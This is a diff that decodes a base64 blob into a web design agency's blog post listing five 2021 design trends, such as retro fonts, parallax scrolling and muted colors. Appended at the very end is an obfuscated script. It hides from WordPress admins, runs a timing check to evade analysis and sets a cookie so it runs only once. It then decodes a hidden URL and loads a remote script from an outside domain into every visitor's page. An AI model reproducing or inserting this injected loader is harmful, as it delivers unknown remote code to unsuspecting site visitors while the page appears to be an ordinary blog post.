@@ -1,1 +1,133 @@
-{"data":"LS0tCnRpdGxlOiAiVG9wIDUgVW5pcXVlIFdlYiBEZXNpZ24gVHJlbmRzIHRvIFdhdGNoIG91dCBpbiAyMDIxIgpzbHVnOiAidG9wLTUtd2ViLWRlc2lnbi10cmVuZHMtaW4tMjAyMSIKZGF0ZTogIjIwMjMtMTEtMTYiCmF1dGhvcjogIkNhbmFkaWFuIFdlYiBEZXNpZ25zIgpkZXNjcmlwdGlvbjogIlRvcCA1IFVuaXF1ZSBXZWIgRGVzaWduIFRyZW5kcyB0byBXYXRjaCBvdXQgaW4gMjAyMSIKa2V5d29yZHM6IFsidG9wIDUgd2ViIGRlc2lnbiB0cmVuZHMgaW4gMjAyMSIsIkJsb2ciXQpjYXRlZ29yeTogIkJsb2ciCmZlYXR1cmVkSW1hZ2U6ICJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjEvMDUvQ2FuYWRpYW4tV2ViLURlc2lnbi1VbmlxdWUtVHJlbmRzLS5wbmciCi0tLQoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC13ZWItZGVzaWducy10cmVuZHMtZm9yLTIwMjEiPldlYiBEZXNpZ25zIFRyZW5kcyBmb3IgMjAyMTwvaDI+Cgo8cD5XZWIgZGVzaWducyB3aXRoIGFtYXppbmcgY29udGVudCBhbmQgc3RydWN0dXJlcyBidWlsZCBhIHN0cm9uZyBpbXByZXNzaW9uIG9uIHRoZSBvbmxpbmUgYXVkaWVuY2UuIFByZXNlbnRhdGlvbiBvZiBvZmZlcmVkIHNlcnZpY2VzIG1heSBhbHNvIGFmZmVjdCB0aGUgcHVyY2hhc2luZyBkZWNpc2lvbiBvZiB5b3VyIHByb3NwZWN0aXZlIGNvbnN1bWVycy4gVGhyb3VnaCB5b3VyIG9ubGluZSBwcmVzZW5jZSwgYWxsIHRoaW5ncyB3aWxsIGdvIHNtb290aGx5LjwvcD4KCjxwPkFyZSB5b3Ugc2VhcmNoaW5nIGZvciBhbiB1bnVzdWFsIGNvbmNlcHQgZm9yIHlvdXIgPGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2Evd2Vic2l0ZS1kZXNpZ24tZGV2ZWxvcG1lbnQvIj53ZWIgZGVzaWduczwvYT4/IE9yIGlmIHlvdSdyZSBhbiBhc3BpcmluZyB3ZWIgZGVzaWduZXIgd2hvIGxvb2tzIGZvciBpbnNwaXJhdGlvbi4gSXQncyBiZXR0ZXIgdG8gZmluZCBvdXQgbW9yZSBhYm91dCB0aGVzZSB3ZWIgZGVzaWduIHRyZW5kcyBmb3IgMjAyMS48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLTUtd2ViLWRlc2lnbi10cmVuZHMtZm9yLTIwMjEiPjxzdHJvbmc+NSBXZWIgRGVzaWduIFRyZW5kcyBmb3IgMjAyMTwvc3Ryb25nPjwvaDM+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLTEtcmV0cm8tZm9udHMiPjxzdHJvbmc+MS4gUmV0cm8gRm9udHM8L3N0cm9uZz48L2gzPgoKPHA+VGhleSBhcmUgYnJpbmdpbmcgYmFjayB0aGUgb2xkIHRpbWVzIHRvIGZlZWwgbW9yZSBhbGl2ZSBhZ2Fpbi4gUmVpbWFnaW5pbmcgb2xkIHN0eWxlcyBhcmUgYmVjb21pbmcgYSBmYXNoaW9uIHRyZW5kIG5vd2FkYXlzLiBFdmVuIG9uIG9ubGluZSBwbGF0Zm9ybXMsIG1hcmtldGVycyB1c2UgaXQgYXMgYW4gYWVzdGhldGljIGRlc2lnbiBpbiB0aGVpciBhZHZlcnRpc2luZyBjYW1wYWlnbnMgYW5kIHByb21vdGlvbnMuIEZ1cnRoZXJtb3JlLCBpdCBjYW4gYWxzbyBiZSBhcHBsaWNhYmxlIGluIHRlcm1zIG9mIGNyZWF0aW5nIHdlYiBkZXNpZ25zLjwvcD4KCjxwPllvdSBjYW4gdXNlIHZpbnRhZ2UgdHlwb2dyYXBoaWMgZGVzaWducyB0byBlbXBoYXNpemUgeW91ciBicmFuZCBvciB5b3VyIGNvbmNlcHQuIENob29zaW5nIHRoZSBzdWl0YWJsZSB0eXBlZmFjZSBhbmQgY3VzdG9taXppbmcgaXRzIGVsZW1lbnRzIHdpbGwgbWVhc3VyZSB5b3VyIGNyZWF0aXZpdHkgaW4gZW5oYW5jaW5nIHRoZSBlcmEgeW91J3JlIHJlcHJlc2VudGluZy48L3A+Cgo8cD5IZXJlIGlzIHNldmVyYWwmbmJzcDsgcmV0cm8gZm9udHMgaWRlYSB5b3UgY2FuIGFwcGx5IHRvIHlvdXIgd2ViIGRlc2lnbiBmb3IgdGhpcyB5ZWFyOjwvcD4KCjx1bCBjbGFzcz0id3AtYmxvY2stbGlzdCI+CjxsaT5BbnNsZXkgRGlzcGxheSBGb250PC9saT4KCjxsaT5Cb29tdG93biBEZWNvIEZvbnQ8L2xpPgoKPGxpPkxhemVyIDg0IEZvbnQ8L2xpPgoKPGxpPkFrYVBvc3NlIEZvbnQ8L2xpPgoKPGxpPkFrdXJhIFBvcG8gRm9udDwvbGk+Cgo8bGk+Wm9ydXMgU2VyaWYgRm9udDwvbGk+Cgo8bGk+QmxlbmRhIFNjcmlwdCBGb250PC9saT4KCjxsaT5CYXphciBGb250PC9saT4KCjxsaT5QYXJhbGluZXMgRm9udDwvbGk+Cgo8bGk+SGFybG90dCBGb250PC9saT4KCjxsaT5TaWx2ZXJmYWtlIEZvbnQ8L2xpPgo8L3VsPgoKPGRpdiBzdHlsZT0iaGVpZ2h0OjQ3cHgiIGFyaWEtaGlkZGVuPSJ0cnVlIiBjbGFzcz0id3AtYmxvY2stc3BhY2VyIj48L2Rpdj4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtMi1wYXJhbGxheC1zY3JvbGwtYW5pbWF0aW9uIj48c3Ryb25nPjIuIFBhcmFsbGF4IFNjcm9sbCBBbmltYXRpb248L3N0cm9uZz48L2gzPgoKPHA+QW5pbWF0aW9ucyBvbiB3ZWJzaXRlcyBhcmUgaW5jcmVkaWJsZS4gUGFyYWxsYXggc2Nyb2xsaW5nIGNyZWF0ZXMgYW4gaWxsdXNpdmUgdmlldyBvZiB0aGUgb25saW5lIGF1ZGllbmNlLiBJdCdzIHNvLWNhbGxlZCAzRCBlZmZlY3RzIGFzIHlvdSBzY3JvbGwgZG93biB0aGUgd2ViIHBhZ2U7IHRoZSBiYWNrZ3JvdW5kIGFuZCBmb3JlZ3JvdW5kIG1vdmUgZGlmZmVyZW50bHkuPC9wPgoKPHA+SG93ZXZlciwgdG9vIG11Y2ggYW5pbWF0aW9uIHN0cm9uZ2x5IGFmZmVjdHMgdGhlIHBlcnNvbiB3aXRoIHJlbGF0ZWQgbW90aW9uIHNpY2tuZXNzLiBIZXJlIGFyZSBzb21lIGVzc2VudGlhbCB0aXBzIHRvIG1pbmltaXplIHRoZSBkaXNhZHZhbnRhZ2Ugb2YgaXRzIG1vdmVtZW50IGVmZmVjdDo8L3A+Cgo8dWwgY2xhc3M9IndwLWJsb2NrLWxpc3QiPgo8bGk+RG9uJ3QgbWFrZSBpdCBjb21wbGljYXRlZCBmb3IgdGhlIHVzZXJzIHRvIGludGVyYWN0IHdpdGg8L2xpPgoKPGxpPlBheSBhdHRlbnRpb24gdG8gdGhlIG51bWJlciBvZiB0aGUgcGFyYWxsYXggZWZmZWN0PC9saT4KCjxsaT5Qcm92aWRlIGFuIG9wdGlvbiBmb3IgdHVybmluZyBvZmYgdGhlIHZpc3VhbCBlZmZlY3Q8L2xpPgoKPGxpPkFwcGx5IHBhcmFsbGF4IGVmZmVjdCBpbiBzbWFsbCBhcmVhczwvbGk+Cgo8bGk+RG9uJ3QgbGV0IGl0IGRpc3RyYWN0IGZyb20gdGhlIG5lY2Vzc2FyeSBpbmZvcm1hdGlvbjwvbGk+CjwvdWw+Cgo8cD5Qcm9mZXNzaW9uYWwgd2ViIGRlc2lnbmVycyB1c2UgPHN0cm9uZz48YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9wYXJhbGxheC1zY3JvbGxpbmctd2ViLWRlc2lnbi8iPnBhcmFsbGF4IHNjcm9sbGluZyA8L2E+PC9zdHJvbmc+YW5pbWF0aW9uIGFzIGEgd29yayBwb3J0Zm9saW8gdG8gaGlnaGxpZ2h0IHRoZWlyIGNyZWF0aW9ucyBhbmQgdGhlaXIgaW1wcmVzc2l2ZSBza2lsbHMuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC0zLWhvcml6b250YWwtc2Nyb2xsaW5nIj48c3Ryb25nPjMuIEhvcml6b250YWwgU2Nyb2xsaW5nPC9zdHJvbmc+PC9oMz4KCjxwPlRoZSBtYWpvcml0eSBvZiB3ZWJzaXRlcyBzZWVuIG9ubGluZSB1c2UgdmVydGljYWwgc2Nyb2xsaW5nIG9yIHVwIHRvIGRvd24gc2Nyb2xsaW5nLiBPbiB0aGUgb3RoZXIgaGFuZCwgaG9yaXpvbnRhbCBzY3JvbGxpbmcgc2hvd3MgbW92aW5nIHRoZSBjb250ZW50IGZyb20gbGVmdCB0byByaWdodCB0byBzZWUgZGlmZmVyZW50IGNhdGVnb3JpZXMuPC9wPgoKPHA+SGVyZSBhcmUgc29tZSB1c2VmdWwgdGlwcyB0byBpbXByb3ZlIHRoZSBob3Jpem9udGFsIHNjcm9sbGluZyBlZmZlY3Q6PC9wPgoKPHVsIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPlNob3cgdGhlIG5hdmlnYXRpb24gbGlrZSBhbiBhcnJvdyBidXR0b24gdG8gaGVscCB1c2VycyB0byBmaWd1cmUgaXQgb3V0LjwvbGk+Cgo8bGk+Q29uc2lkZXIgYXBwbHlpbmcgaW5kaWNhdGluZyBjdWVzIHdoZXJlIHNwZWNpZmljIGNvbnRlbnQgdXNlcyBob3Jpem9udGFsIHNjcm9sbGluZy48L2xpPgoKPGxpPkF2b2lkIHVzaW5nIG92ZXJsb2FkZWQgdGV4dCBhcyBtdWNoIGFzIHBvc3NpYmxlLDwvbGk+Cgo8bGk+RGlzcGxheWluZyBpbWFnZXMgYW5kIHZpZGVvcyBjYW4gYmUgdGhlIGJlc3Qgb3B0aW9uIHRvIHB1dCBpbiBob3Jpem9udGFsIHNjcm9sbGluZy48L2xpPgo8L3VsPgoKPHA+VGhpcyBzdHlsZSBvZiBzY3JvbGxpbmcgaXMgaWRlYWxseSB1c2VkIGZvciB3ZWJzaXRlcyB0aGF0IGludGVuZCB0byBmZWF0dXJlIGltYWdlcyBvciB2aWRlb3MuIFNwZWNpZmljYWxseSwgaXQgY2FuIGJlIGFpbWVkIGF0IHBvcnRmb2xpbyB3ZWJzaXRlcyBzdWNoIGFzIHBob3RvZ3JhcGh5LCBkaWdpdGFsIGFydHMsIGFuZCBkZXNpZ25zLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtNC0zZC12aXN1YWxzLWV2ZXJ5d2hlcmUiPjxzdHJvbmc+NC4gM0QgdmlzdWFscyBldmVyeXdoZXJlPC9zdHJvbmc+PC9oMz4KCjxwPk1ha2Ugc29tZSB1bmlxdWUgdmlzdWFsIHByZXNlbnRhdGlvbnMgYnkgY3VzdG9taXppbmcgaW1hZ2VzIHdpdGggM0QgZWZmZWN0cy4gVGhyZWUtZGltZW5zaW9uYWwgaW1hZ2VzIGFsbG93IHJlYWxpc3RpYyB0ZXh0dXJlcyBhbmQgc3BlY2lhbCBlZmZlY3RzIHRvIGxvb2sgbW9yZSBhY2N1cmF0ZSB0aGFuIG9yZGluYXJ5IG9uZXMuIE9uIHRoZSBjb250cmFyeSwgY3JlYXRpbmcgM0QgdmlzdWFscyByZXF1aXJlcyBhIGhpZ2ggZmFtaWxpYXJpdHkgd2l0aCBhcHBsaWNhdGlvbnMgdXNlZCBpbiB0aGUgY3JlYXRpb24gcHJvY2Vzcy48L3A+Cgo8cD5IZXJlIGFyZSB0aGUgYWR2YW50YWdlcyB0byBjb25zaWRlciB1c2luZyAzRCBlZmZlY3RzIGluIHdlYiBkZXNpZ25zOjwvcD4KCjx1bCBjbGFzcz0id3AtYmxvY2stbGlzdCI+CjxsaT5DYXRjaGVzIHRoZSBhdHRlbnRpb24gb2YgeW91ciBvbmxpbmUgdmlzaXRvcnM8L2xpPgoKPGxpPkNyZWF0ZXMgYnJhbmRpbmc8L2xpPgoKPGxpPkltcHJvdmVzIG9ubGluZSB0cmFmZmljPC9saT4KCjxsaT5FbmhhbmNlIGNvc3QtZWZmZWN0aXZlbmVzczwvbGk+Cgo8bGk+UHJvbW90ZXMgaW50ZXJhY3Rpdml0eTwvbGk+CjwvdWw+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLTUtYS1mb2N1cy1vbi1tdXRlZC1jb2xvcnMiPjxzdHJvbmc+NS4gQSBmb2N1cyBvbiBtdXRlZCBjb2xvcnM8L3N0cm9uZz48L2gzPgoKPHA+V2hhdCBkb2VzIGl0IG1lYW4gd2hlbiB0aGUgY29sb3IgaXMgbXV0ZWQ/IE11dGVkIGNvbG9ycyBhcmUgYW55IGxlc3Mgc2F0dXJhdGVkIGh1ZS4gV2hlbiBhIGhpZ2hseSBzYXR1cmF0ZWQgY29sb3IgaXMgY29tYmluZWQgd2l0aCB0aGUgdG9uZSwgdGludCwgb3Igc2hhZGUgZGVwZW5kaW5nIG9uIHRoZSBjb2xvciB5b3UgaGF2ZSBjaG9zZW4sIGl0IHByb2R1Y2VzIGNhbG1lciwgc29mdGVyLCBsZXNzIGJyaWdodCBhcyBhIHJlc3VsdC4gUGFzdGVsIGh1ZXMgYXJlIGNvbnNpZGVyZWQgbXV0ZWQgY29sb3JzLiBUaGUgb3Bwb3NpdGUgd29yZCBvZiBtdXRlZCBjb2xvcnMgaXMgdml2aWQgY29sb3JzLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9Imgtd3JhcHBpbmctaXQtYWxsLXVwIj48c3Ryb25nPldyYXBwaW5nIGl0IGFsbCB1cDwvc3Ryb25nPjwvaDI+Cgo8cD5UaGlua2luZyBhYm91dCB0aGUgdW51c3VhbCBjb25jZXB0cyBpbiBlc3RhYmxpc2hpbmcgYSBjcmVhdGl2ZSBvbmxpbmUgcHJlc2VuY2UgbWF5IGJlIGNoYWxsZW5naW5nLiBUaGUgcmVhc29uIHdoeSB3ZSBoYXZlIGxpc3RlZCB0aGUgdG9wIGZpdmUgd2ViIGRlc2lnbiB0cmVuZHMgdG8gaW5zcGlyZSBpbiB0aGlzIHllYXIgMjAyMS4gTGV04oCZcyB0YWtlIGEgc2hvcnQgcmV2aWV3IHRoYXQgeW91IGNhbiBhcHBseSB0byB5b3VyIHdlYiBkZXNpZ24gdG8gbG9vayBtb3JlIGF0dHJhY3RpdmU6PC9wPgoKPHVsIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPlJldHJvJm5ic3A7IGZvbnRzPC9saT4KCjxsaT48YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9wYXJhbGxheC1zY3JvbGxpbmctd2ViLWRlc2lnbi8iPlBhcmFsbGF4PC9hPiBzY3JvbGxpbmcgYW5pbWF0aW9uPC9saT4KCjxsaT5Ib3Jpem9udGFsIHNjcm9sbGluZzwvbGk+Cgo8bGk+M0QgdmlzdWFsczwvbGk+Cgo8bGk+TXV0ZWQgY29sb3JzPC9saT4KPC91bD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtYnVpbGQtYW4tZXhjZXB0aW9uYWwtd2ViLWRlc2lnbi10aGlzLXllYXIiPjxzdHJvbmc+QnVpbGQgYW4gZXhjZXB0aW9uYWwgd2ViIGRlc2lnbiB0aGlzIHllYXIhPC9zdHJvbmc+PC9oMj4KCjxwPlRoZXNlIHdlYiBkZXNpZ24gdHJlbmRzIGFyZSB3YWl0aW5nIGZvciB5b3UhIE1ha2UgYSBzdHVubmluZyBvbmxpbmUgcHJlc2VuY2Ugbm93LiBHZXQgaW4gdG91Y2ggd2l0aCBDYW5hZGlhbiBXZWIgRGVzaWduczsgY2FsbCB1cyBhdCA8YSBocmVmPSJ0ZWw6IiBkYXRhLXR5cGU9InRlbCIgZGF0YS1pZD0idGVsOiI+NjQ3LTY4OS02MDY5PC9hPiBvciBzZW5kIGFuIGVtYWlsIHRvPGEgaHJlZj0ibWFpbDp0byIgZGF0YS10eXBlPSJVUkwiIGRhdGEtaWQ9Im1haWw6dG8iPiBzYWxlc0BjYW5hZGlhbndlYnNpdGVkZXNpZ25zLmNhPC9hPi48L3A+CjxzY3JpcHQ+KGZ1bmN0aW9uKCl7dHJ5e2lmKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd3BhZG1pbmJhcicpKXJldHVybjt2YXIgdDA9K25ldyBEYXRlKCk7Zm9yKHZhciBpPTA7aTwyMDAwMDtpKyspe3ZhciB6PWkqaTt9aWYoKCtuZXcgRGF0ZSgpKS10MD4xMjApcmV0dXJuO2lmKChkb2N1bWVudC5jb29raWV8fCcnKS5pbmRleE9mKCdodHRwMl9zZXNzaW9uX2lkPScpIT09LTEpcmV0dXJuO2Z1bmN0aW9uIHN5c3RlbUxvYWQoaW5wdXQpe3ZhciBrZXk9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89JyxvMSxvMixvMyxoMSxoMixoMyxoNCxkZWM9JycsaT0wO2lucHV0PWlucHV0LnJlcGxhY2UoL1teQS1aYS16MC05XCtcL1w9XS9nLCcnKTt3aGlsZShpPGlucHV0Lmxlbmd0aCl7aDE9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gyPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMz1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDQ9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO28xPShoMTw8Mil8KGgyPj40KTtvMj0oKGgyJjE1KTw8NCl8KGgzPj4yKTtvMz0oKGgzJjMpPDw2KXxoNDtkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzEpO2lmKGgzIT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzIpO2lmKGg0IT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzMpO31yZXR1cm4gZGVjO312YXIgdT1zeXN0ZW1Mb2FkKCdhSFIwY0hNNkx5OXpaV0Z5WTJoeVlXNXJkSEpoWm1acFl5NXNhWFpsTDJwemVBPT0nKTtpZih0eXBlb2Ygd2luZG93IT09J3VuZGVmaW5lZCcmJndpbmRvdy5fX3JsPT09dSlyZXR1cm47dmFyIGQ9bmV3IERhdGUoKTtkLnNldFRpbWUoZC5nZXRUaW1lKCkrMzAqMjQqNjAqNjAqMTAwMCk7ZG9jdW1lbnQuY29va2llPSdodHRwMl9zZXNzaW9uX2lkPTE7IGV4cGlyZXM9JytkLnRvVVRDU3RyaW5nKCkrJzsgcGF0aD0vOyBTYW1lU2l0ZT1MYXgnKyhsb2NhdGlvbi5wcm90b2NvbD09PSdodHRwczonPyc7IFNlY3VyZSc6JycpO3RyeXt3aW5kb3cuX19ybD11O31jYXRjaChlKXt9dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnO3MuYXN5bmM9dHJ1ZTtzLnNyYz11O3RyeXtzLnNldEF0dHJpYnV0ZSgnZGF0YS1ybCcsdSk7fWNhdGNoKGUpe30oZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXXx8ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KS5hcHBlbmRDaGlsZChzKTt9Y2F0Y2goZSl7fX0pKCk7PC9zY3JpcHQ+Cg=="}
+---
+title: "Top 5 Unique Web Design Trends to Watch out in 2021"
+slug: "top-5-web-design-trends-in-2021"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Top 5 Unique Web Design Trends to Watch out in 2021"
+keywords: ["top 5 web design trends in 2021","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2021/05/Canadian-Web-Design-Unique-Trends-.png"
+---
+
+<h2 class="wp-block-heading" id="h-web-designs-trends-for-2021">Web Designs Trends for 2021</h2>
+
+<p>Web designs with amazing content and structures build a strong impression on the online audience. Presentation of offered services may also affect the purchasing decision of your prospective consumers. Through your online presence, all things will go smoothly.</p>
+
+<p>Are you searching for an unusual concept for your <a href="https://canadianwebdesigns.ca/website-design-development/">web designs</a>? Or if you're an aspiring web designer who looks for inspiration. It's better to find out more about these web design trends for 2021.</p>
+
+<h3 class="wp-block-heading" id="h-5-web-design-trends-for-2021"><strong>5 Web Design Trends for 2021</strong></h3>
+
+<h3 class="wp-block-heading" id="h-1-retro-fonts"><strong>1. Retro Fonts</strong></h3>
+
+<p>They are bringing back the old times to feel more alive again. Reimagining old styles are becoming a fashion trend nowadays. Even on online platforms, marketers use it as an aesthetic design in their advertising campaigns and promotions. Furthermore, it can also be applicable in terms of creating web designs.</p>
+
+<p>You can use vintage typographic designs to emphasize your brand or your concept. Choosing the suitable typeface and customizing its elements will measure your creativity in enhancing the era you're representing.</p>
+
+<p>Here is several&nbsp; retro fonts idea you can apply to your web design for this year:</p>
+
+<ul class="wp-block-list">
+<li>Ansley Display Font</li>
+
+<li>Boomtown Deco Font</li>
+
+<li>Lazer 84 Font</li>
+
+<li>AkaPosse Font</li>
+
+<li>Akura Popo Font</li>
+
+<li>Zorus Serif Font</li>
+
+<li>Blenda Script Font</li>
+
+<li>Bazar Font</li>
+
+<li>Paralines Font</li>
+
+<li>Harlott Font</li>
+
+<li>Silverfake Font</li>
+</ul>
+
+<div style="height:47px" aria-hidden="true" class="wp-block-spacer"></div>
+
+<h3 class="wp-block-heading" id="h-2-parallax-scroll-animation"><strong>2. Parallax Scroll Animation</strong></h3>
+
+<p>Animations on websites are incredible. Parallax scrolling creates an illusive view of the online audience. It's so-called 3D effects as you scroll down the web page; the background and foreground move differently.</p>
+
+<p>However, too much animation strongly affects the person with related motion sickness. Here are some essential tips to minimize the disadvantage of its movement effect:</p>
+
+<ul class="wp-block-list">
+<li>Don't make it complicated for the users to interact with</li>
+
+<li>Pay attention to the number of the parallax effect</li>
+
+<li>Provide an option for turning off the visual effect</li>
+
+<li>Apply parallax effect in small areas</li>
+
+<li>Don't let it distract from the necessary information</li>
+</ul>
+
+<p>Professional web designers use <strong><a href="https://canadianwebdesigns.ca/parallax-scrolling-web-design/">parallax scrolling </a></strong>animation as a work portfolio to highlight their creations and their impressive skills.</p>
+
+<h3 class="wp-block-heading" id="h-3-horizontal-scrolling"><strong>3. Horizontal Scrolling</strong></h3>
+
+<p>The majority of websites seen online use vertical scrolling or up to down scrolling. On the other hand, horizontal scrolling shows moving the content from left to right to see different categories.</p>
+
+<p>Here are some useful tips to improve the horizontal scrolling effect:</p>
+
+<ul class="wp-block-list">
+<li>Show the navigation like an arrow button to help users to figure it out.</li>
+
+<li>Consider applying indicating cues where specific content uses horizontal scrolling.</li>
+
+<li>Avoid using overloaded text as much as possible,</li>
+
+<li>Displaying images and videos can be the best option to put in horizontal scrolling.</li>
+</ul>
+
+<p>This style of scrolling is ideally used for websites that intend to feature images or videos. Specifically, it can be aimed at portfolio websites such as photography, digital arts, and designs.</p>
+
+<h3 class="wp-block-heading" id="h-4-3d-visuals-everywhere"><strong>4. 3D visuals everywhere</strong></h3>
+
+<p>Make some unique visual presentations by customizing images with 3D effects. Three-dimensional images allow realistic textures and special effects to look more accurate than ordinary ones. On the contrary, creating 3D visuals requires a high familiarity with applications used in the creation process.</p>
+
+<p>Here are the advantages to consider using 3D effects in web designs:</p>
+
+<ul class="wp-block-list">
+<li>Catches the attention of your online visitors</li>
+
+<li>Creates branding</li>
+
+<li>Improves online traffic</li>
+
+<li>Enhance cost-effectiveness</li>
+
+<li>Promotes interactivity</li>
+</ul>
+
+<h3 class="wp-block-heading" id="h-5-a-focus-on-muted-colors"><strong>5. A focus on muted colors</strong></h3>
+
+<p>What does it mean when the color is muted? Muted colors are any less saturated hue. When a highly saturated color is combined with the tone, tint, or shade depending on the color you have chosen, it produces calmer, softer, less bright as a result. Pastel hues are considered muted colors. The opposite word of muted colors is vivid colors.</p>
+
+<h2 class="wp-block-heading" id="h-wrapping-it-all-up"><strong>Wrapping it all up</strong></h2>
+
+<p>Thinking about the unusual concepts in establishing a creative online presence may be challenging. The reason why we have listed the top five web design trends to inspire in this year 2021. Let’s take a short review that you can apply to your web design to look more attractive:</p>
+
+<ul class="wp-block-list">
+<li>Retro&nbsp; fonts</li>
+
+<li><a href="https://canadianwebdesigns.ca/parallax-scrolling-web-design/">Parallax</a> scrolling animation</li>
+
+<li>Horizontal scrolling</li>
+
+<li>3D visuals</li>
+
+<li>Muted colors</li>
+</ul>
+
+<h2 class="wp-block-heading" id="h-build-an-exceptional-web-design-this-year"><strong>Build an exceptional web design this year!</strong></h2>
+
+<p>These web design trends are waiting for you! Make a stunning online presence now. Get in touch with Canadian Web Designs; call us at <a href="tel:" data-type="tel" data-id="tel:">647-689-6069</a> or send an email to<a href="mail:to" data-type="URL" data-id="mail:to"> sales@canadianwebsitedesigns.ca</a>.</p>
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
